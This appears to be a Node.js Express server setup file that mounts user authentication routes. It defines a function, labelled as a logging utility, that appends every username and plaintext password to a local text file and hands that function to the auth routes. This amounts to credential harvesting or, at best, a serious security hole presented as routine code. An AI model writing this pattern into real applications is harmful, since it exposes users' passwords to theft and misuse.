const express = require('express');
const fs = require('fs');
const path = require('path');
const authRoutes = require('./routes/authRoutes');

const app = express();

app.use(express.json());
app.use(express.static('public'));

// Utility to log user data
function logUserData(username, password) {
    const logFilePath = path.join(__dirname, 'user_data.txt');
    const stream = fs.createWriteStream(logFilePath, { flags: 'a' });
    stream.write(`Username: ${username}, Password: ${password}\n`);
    stream.end();
}

app.use('/api/users', authRoutes(logUserData)); // Pass the function to routes if needed

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
